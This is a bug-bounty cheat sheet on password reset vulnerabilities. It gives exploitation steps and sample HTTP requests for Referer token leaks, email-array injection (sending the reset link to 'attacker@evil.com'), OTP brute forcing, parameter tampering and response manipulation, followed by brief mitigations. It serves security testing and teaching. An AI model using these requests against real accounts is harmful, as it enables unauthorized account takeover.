# 🔒 Common Security Flaws in Password Reset Functionality

*A comprehensive compilation of password reset vulnerabilities from Twitter, bug bounty writeups, and disclosed security reports.*

---

## 1. 🔗 Password Reset Token Leak Via Referrer

### Overview
The HTTP Referer header is an optional HTTP header field that identifies the address of the webpage which linked to the resource being requested. This header contains the address of the previous web page from which a link to the currently requested page was followed.

### 🎯 Exploitation Steps
1. **Request password reset** to your email address
2. **Click on the password reset link** received in email
3. **Don't change the password** - leave the reset page open
4. **Click any 3rd party websites** (e.g., Facebook, Twitter) from the reset page
5. **Intercept the request** in Burp Suite proxy
6. **Check if the Referer header** is leaking the password reset token

### ⚠️ Impact
Token exposure through referrer headers can lead to account takeover if malicious third-party sites capture these tokens.

---

## 2. 📧 Array Injection in Email Parameter

### Overview
This vulnerability occurs when the application accepts an array of email addresses instead of a single email address for password reset requests, potentially sending reset links to multiple recipients including attackers.

### 🎯 Exploitation Example

**Original Request:**
```http
POST https://example.com/api/v1/password_reset HTTP/1.1
Content-Type: application/json

{"email_address":"victim@gmail.com"}
```

**Modified Request:**
```http
POST https://example.com/api/v1/password_reset HTTP/1.1
Content-Type: application/json

{"email_address":["victim@breadcrumb.com","attacker@evil.com"]}
```

### ⚠️ Impact
The password reset link gets sent to both the victim and the attacker, enabling **Full Account Takeover**.

---

## 3. 🔢 OTP Brute Force Attack

### Overview
When password reset functionality relies on OTP (One-Time Password) validation without proper rate limiting, attackers can brute force the OTP to gain unauthorized access.

### 🎯 Exploitation Steps
1. **Start Burp Suite** and intercept the password reset request
2. **Send the request to Intruder**
3. **Configure payload positions** for the OTP field
4. **Use number payload** (000000-999999 for 6-digit OTP)
5. **Launch the attack** to brute force valid OTP

### ⚠️ Impact
Successful OTP brute force can lead to unauthorized password reset and complete account compromise.

---

## 4. 🔄 Account Takeover via API Parameter Manipulation

### Overview
This vulnerability occurs when change password API endpoints don't properly validate user authorization, allowing attackers to change passwords for arbitrary users by manipulating email parameters.

### 🎯 Exploitation Steps
1. **Login with attacker account** and navigate to change password function
2. **Start Burp Suite** and intercept the password change request
3. **Send request to Repeater** and modify the email parameter to target victim
4. **Execute the request** with victim's email and attacker's chosen password

**Example Request:**
```http
POST /api/changepass HTTP/1.1
Content-Type: application/json

{
  "email": "victim@email.tld",
  "password": "attackerPassword123"
}
```

### ⚠️ Impact
Direct account takeover by changing victim's password without authorization.

---

## 5. 🔀 Response Manipulation Bypass

### Overview
Some applications rely solely on client-side response validation, allowing attackers to manipulate error responses to bypass security controls.

### 🎯 Exploitation Technique

**Original Response:**
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{
  "message": "unsuccessful",
  "statusCode": 403,
  "errorDescription": "Unsuccessful"
}
```

**Modified Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "success",
  "statusCode": 200,
  "errorDescription": "Success"
}
```

### ⚠️ Impact
Bypasses client-side validation and may grant unauthorized access to password reset functionality.

---

## 🛡️ Mitigation Strategies

- **Implement proper rate limiting** for OTP attempts
- **Use secure token generation** with sufficient entropy
- **Validate user authorization** before allowing password changes
- **Implement server-side validation** instead of relying on client responses
- **Sanitize and validate** all input parameters including arrays
- **Use secure referrer policies** to prevent token leakage

---

## 📚 Additional Resources

For more detailed analysis and real-world examples, check out this comprehensive blog post: 
**[Hunting for Bugs in Password Reset Feature - 2021](https://sm4rty.medium.com/hunting-for-bugs-in-password-reset-feature-2021-3def1b391bef)**

---

*Happy Bug Hunting! 🐛🔍*
